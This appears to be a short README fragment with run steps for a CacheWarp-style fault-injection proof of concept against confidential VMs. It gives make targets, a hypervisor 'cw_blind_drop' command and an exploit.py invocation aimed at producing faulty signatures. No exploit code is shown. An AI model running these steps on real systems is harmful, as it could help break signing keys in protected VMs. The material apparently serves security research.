## Run

Set `UC_VMSA` to 0 in `cachewarp.c` for blind drops.

``` bash
# You will observe a correct signature
vm> make all 

# Keep signing until a fault leads to a different signature
vm> make exploit
```

## Blindly drop  
``` bash
hv> sudo ./cw_blind_drop 70 100 0 0
```

``` bash
vm> python3 exploit.py
```
